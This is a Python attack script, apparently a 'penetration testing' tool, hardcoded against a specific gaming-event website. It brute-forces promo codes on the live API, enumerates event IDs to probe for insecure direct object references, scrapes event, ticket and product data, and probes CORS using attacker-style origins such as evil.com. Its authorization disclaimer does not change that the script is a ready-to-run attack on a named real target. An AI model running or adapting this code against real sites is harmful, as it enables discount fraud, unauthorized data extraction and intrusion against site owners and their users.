#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
REAL DATA EXTRACTION - ACTUAL FINDINGS
This tool exploits the vulnerabilities to get REAL data from the server
For authorized penetration testing only (system owner)
"""

import requests
import json
import os
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init

init(autoreset=True)

class RealDataExtractor:
    """
    Actually exploits vulnerabilities to extract real data
    """
    
    def __init__(self, base_url="https://insomniagamingegypt.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
        })
        
        self.output_dir = f"evidence\ACTUAL_FINDINGS_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.real_findings = []
    
    def save_real_data(self, name, data):
        """Save actual extracted data"""
        filepath = os.path.join(self.output_dir, f"{name}.json")
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"{Fore.GREEN}[SAVED] {filepath}")
        return filepath
    
    # ===================================================================
    # REAL FINDING #1: Test if promo code endpoint actually works
    # ===================================================================
    def extract_promo_code_validation_real(self):
        """Actually test the promo code endpoint with real requests"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}REAL FINDING #1: Promo Code Endpoint Vulnerability")
        print(f"{Fore.RED}{'='*70}\n")
        
        # Test with codes that might actually exist
        test_codes = [
            "TEST", "TEST1", "TEST123", "CODE", "CODE1", "PROMO",
            "PROMO2024", "SPRING", "SPRING2024", "SUMMER", "FALL", "WINTER",
            "GAMER", "GAMER50", "GAMING", "EGYPT", "CAIRO", "INSOMNIA",
            "BME", "BME2024", "FESTIVAL", "EVENT", "TOURNAMENT",
            "WELCOME", "DISCOUNT", "SALE", "VIP", "EARLYBIRD",
            "3DS6-TEST-TEST", "3DS6-AAAA-BBBB",  # Pattern-based
        ]
        
        real_results = []
        valid_codes_found = []
        
        print(f"{Fore.CYAN}[TESTING] {len(test_codes)} codes against live API...")
        
        for code in test_codes:
            try:
                url = f"{self.base_url}/api/public/events/1/promo-codes/{code}"
                resp = self.session.get(url, timeout=5)
                
                result = {
                    'code': code,
                    'status': resp.status_code,
                    'response': None,
                    'headers': dict(resp.headers)
                }
                
                try:
                    result['response'] = resp.json()
                    # Check if code is actually valid
                    if result['response'].get('valid') is True:
                        valid_codes_found.append(code)
                        print(f"{Fore.GREEN}[VALID CODE FOUND] {code}!")
                        print(f"  Response: {result['response']}")
                except:
                    result['response_text'] = resp.text[:200]
                
                real_results.append(result)
                
                # Show progress
                if resp.status_code == 200:
                    print(f"  {code}: 200 OK - {result['response']}")
                
                # Respectful delay
                time.sleep(0.5)
                
            except Exception as e:
                print(f"  {code}: ERROR - {e}")
        
        finding = {
            'vulnerability': 'Promo Code Enumeration',
            'endpoint': '/api/public/events/{id}/promo-codes/{code}',
            'total_tested': len(test_codes),
            'valid_codes_found': valid_codes_found,
            'all_results': real_results,
            'timestamp': datetime.now().isoformat()
        }
        
        self.real_findings.append(finding)
        self.save_real_data('FINDING_01_promo_code_validation', finding)
        
        print(f"\n{Fore.YELLOW}[RESULT] Tested {len(test_codes)} codes")
        print(f"{Fore.YELLOW}[RESULT] Found {len(valid_codes_found)} valid codes")
        if valid_codes_found:
            print(f"{Fore.RED}[CRITICAL] VALID CODES: {valid_codes_found}")
        
        return finding
    
    # ===================================================================
    # REAL FINDING #2: Enumerate all accessible events
    # ===================================================================
    def extract_all_events_real(self):
        """Enumerate all event IDs to find accessible data"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}REAL FINDING #2: Event ID Enumeration (IDOR)")
        print(f"{Fore.RED}{'='*70}\n")
        
        accessible_events = []
        
        print(f"{Fore.CYAN}[ENUMERATING] Testing event IDs 1-50...")
        
        for event_id in range(1, 51):
            try:
                url = f"{self.base_url}/api/public/events/{event_id}"
                resp = self.session.get(url, timeout=5)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        event_info = {
                            'id': event_id,
                            'accessible': True,
                            'title': data.get('data', {}).get('title', 'Unknown'),
                            'status': data.get('data', {}).get('status', 'Unknown'),
                            'size': len(resp.text)
                        }
                        accessible_events.append(event_info)
                        print(f"{Fore.GREEN}[FOUND] Event {event_id}: {event_info['title']}")
                    except:
                        accessible_events.append({
                            'id': event_id,
                            'accessible': True,
                            'size': len(resp.text)
                        })
                elif resp.status_code == 404:
                    print(f"  Event {event_id}: Not found (404)", end='\r')
                else:
                    print(f"  Event {event_id}: Status {resp.status_code}")
                
                time.sleep(0.3)
                
            except Exception as e:
                pass
        
        finding = {
            'vulnerability': 'Insecure Direct Object Reference (IDOR)',
            'endpoint': '/api/public/events/{id}',
            'total_tested': 50,
            'accessible_events': accessible_events,
            'accessible_count': len(accessible_events),
            'timestamp': datetime.now().isoformat()
        }
        
        self.real_findings.append(finding)
        self.save_real_data('FINDING_02_event_enumeration', finding)
        
        print(f"\n{Fore.YELLOW}[RESULT] Found {len(accessible_events)} accessible events")
        for event in accessible_events:
            print(f"  - Event {event['id']}: {event.get('title', 'Unknown')}")
        
        return finding
    
    # ===================================================================
    # REAL FINDING #3: Extract full event data
    # ===================================================================
    def extract_full_event_data(self, event_id=1):
        """Get complete data for events"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}REAL FINDING #3: Full Event Data Extraction")
        print(f"{Fore.RED}{'='*70}\n")
        
        endpoints = [
            f'/api/public/events/{event_id}',
            f'/api/public/events/{event_id}/questions',
            f'/api/public/events/{event_id}/tickets',
            f'/api/public/events/{event_id}/products',
        ]
        
        all_data = {}
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                resp = self.session.get(url, timeout=5)
                
                endpoint_data = {
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'size': len(resp.text),
                    'data': None
                }
                
                if resp.status_code == 200:
                    try:
                        endpoint_data['data'] = resp.json()
                        print(f"{Fore.GREEN}[EXTRACTED] {endpoint} - {len(resp.text)} bytes")
                    except:
                        endpoint_data['text'] = resp.text[:500]
                        print(f"{Fore.YELLOW}[NON-JSON] {endpoint} - {len(resp.text)} bytes")
                else:
                    print(f"{Fore.RED}[{resp.status_code}] {endpoint}")
                
                all_data[endpoint] = endpoint_data
                time.sleep(0.5)
                
            except Exception as e:
                print(f"{Fore.RED}[ERROR] {endpoint}: {e}")
        
        finding = {
            'vulnerability': 'Information Disclosure',
            'event_id': event_id,
            'endpoints_tested': endpoints,
            'extracted_data': all_data,
            'timestamp': datetime.now().isoformat()
        }
        
        self.real_findings.append(finding)
        self.save_real_data('FINDING_03_full_event_data', finding)
        
        return finding
    
    # ===================================================================
    # REAL FINDING #4: CORS Vulnerability Test
    # ===================================================================
    def test_cors_vulnerability_real(self):
        """Actually test CORS misconfiguration"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}REAL FINDING #4: CORS Misconfiguration")
        print(f"{Fore.RED}{'='*70}\n")
        
        origins = [
            'https://evil.com',
            'https://attacker.com',
            'http://localhost:3000',
            'null',
            'https://any-domain.com'
        ]
        
        cors_results = []
        vulnerable = False
        
        print(f"{Fore.CYAN}[TESTING] CORS with different origins...")
        
        for origin in origins:
            try:
                headers = {'Origin': origin}
                resp = self.session.get(
                    f"{self.base_url}/api/public/events/1",
                    headers=headers,
                    timeout=5
                )
                
                allow_origin = resp.headers.get('Access-Control-Allow-Origin')
                allow_creds = resp.headers.get('Access-Control-Allow-Credentials')
                
                result = {
                    'test_origin': origin,
                    'access_control_allow_origin': allow_origin,
                    'access_control_allow_credentials': allow_creds,
                    'vulnerable': allow_origin == origin or allow_origin == '*'
                }
                
                if result['vulnerable']:
                    vulnerable = True
                    print(f"{Fore.RED}[VULNERABLE] Origin {origin} allowed!")
                    print(f"  CORS Header: {allow_origin}")
                else:
                    print(f"  {origin}: Not allowed (safe)")
                
                cors_results.append(result)
                time.sleep(0.3)
                
            except Exception as e:
                print(f"  {origin}: Error - {e}")
        
        finding = {
            'vulnerability': 'CORS Misconfiguration' if vulnerable else 'CORS Properly Configured',
            'tested_origins': origins,
            'results': cors_results,
            'is_vulnerable': vulnerable,
            'timestamp': datetime.now().isoformat()
        }
        
        self.real_findings.append(finding)
        self.save_real_data('FINDING_04_cors_test', finding)
        
        if vulnerable:
            print(f"\n{Fore.RED}[CRITICAL] CORS vulnerability confirmed!")
            print(f"{Fore.RED}Any website can make requests to your API!")
        
        return finding
    
    # ===================================================================
    # REAL FINDING #5: Security Headers Analysis
    # ===================================================================
    def analyze_security_headers_real(self):
        """Analyze actual security headers from responses"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}REAL FINDING #5: Security Headers Analysis")
        print(f"{Fore.RED}{'='*70}\n")
        
        try:
            resp = self.session.get(f"{self.base_url}/api/public/events/1", timeout=5)
            headers = dict(resp.headers)
            
            security_headers = {
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Referrer-Policy': headers.get('Referrer-Policy'),
                'Permissions-Policy': headers.get('Permissions-Policy'),
                'X-XSS-Protection': headers.get('X-XSS-Protection'),
            }
            
            missing = [h for h, v in security_headers.items() if not v]
            present = {h: v for h, v in security_headers.items() if v}
            
            # Information disclosure
            info_disclosure = {
                'Server': headers.get('Server'),
                'X-Powered-By': headers.get('X-Powered-By'),
                'X-Served-By': headers.get('X-Served-By')
            }
            
            finding = {
                'vulnerability': 'Missing Security Headers' if missing else 'Security Headers Present',
                'missing_headers': missing,
                'present_headers': present,
                'information_disclosure': info_disclosure,
                'timestamp': datetime.now().isoformat()
            }
            
            self.real_findings.append(finding)
            self.save_real_data('FINDING_05_security_headers', finding)
            
            print(f"{Fore.YELLOW}[MISSING] {len(missing)} security headers:")
            for h in missing:
                print(f"  - {h}")
            
            print(f"\n{Fore.RED}[INFO LEAK] Server info exposed:")
            for k, v in info_disclosure.items():
                if v:
                    print(f"  - {k}: {v}")
            
            return finding
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")
            return None
    
    def generate_real_findings_report(self):
        """Generate comprehensive report of actual findings"""
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}REAL FINDINGS - COMPLETE REPORT")
        print(f"{Fore.GREEN}{'='*70}\n")
        
        print(f"{Fore.CYAN}Total Real Findings: {len(self.real_findings)}\n")
        
        for i, finding in enumerate(self.real_findings, 1):
            vuln = finding.get('vulnerability', 'Unknown')
            print(f"{Fore.YELLOW}[{i}] {vuln}")
            
            if 'valid_codes_found' in finding:
                codes = finding['valid_codes_found']
                print(f"    Valid codes found: {len(codes)}")
                if codes:
                    print(f"    {Fore.RED}CODES: {codes}")
            
            if 'accessible_events' in finding:
                print(f"    Accessible events: {finding.get('accessible_count', 0)}")
            
            if 'is_vulnerable' in finding:
                status = f"{Fore.RED}VULNERABLE" if finding['is_vulnerable'] else f"{Fore.GREEN}SAFE"
                print(f"    Status: {status}")
        
        # Save master report
        master_report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'total_findings': len(self.real_findings),
            'findings': self.real_findings
        }
        
        report_path = os.path.join(self.output_dir, 'MASTER_REAL_FINDINGS_REPORT.json')
        with open(report_path, 'w') as f:
            json.dump(master_report, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Master report saved: {report_path}")
        print(f"{Fore.GREEN}[+] All findings in: {self.output_dir}")
    
    def run_real_extraction(self):
        """Run all real data extraction"""
        print(f"""
{Fore.RED}
  ____            _       _             _     _              _   _
 |  _ \ _ __ ___ (_) __ _| |_ ___    __| | __| |_   _ ___ __| | | | ___
 | |_) | '__/ _ \| |/ _` | __/ _ \  / _` |/ _` | | | / __/ _` | | |/ _ \
 |  _ <| | | (_) | | (_| | ||  __/ | (_| | (_| | |_| \__ \ (_| |_| |  __/
 |_| \_\_|  \___// |\__,_|\__\___|  \__,_|\__,_|\__, |___/\__,_(_)_|\___|
              |__/                             |___/

        REAL DATA EXTRACTION - ACTUAL VULNERABILITY FINDINGS
        Target: {self.base_url}
        """)
        
        print(f"{Fore.YELLOW}[!] This will extract REAL data by exploiting vulnerabilities")
        print(f"{Fore.YELLOW}[!] Only run against systems you own!\n")
        
        # Run all extraction methods
        self.extract_promo_code_validation_real()
        self.extract_all_events_real()
        self.extract_full_event_data(1)
        self.extract_full_event_data(2)
        self.test_cors_vulnerability_real()
        self.analyze_security_headers_real()
        
        # Generate final report
        self.generate_real_findings_report()

if __name__ == "__main__":
    extractor = RealDataExtractor()
    extractor.run_real_extraction()
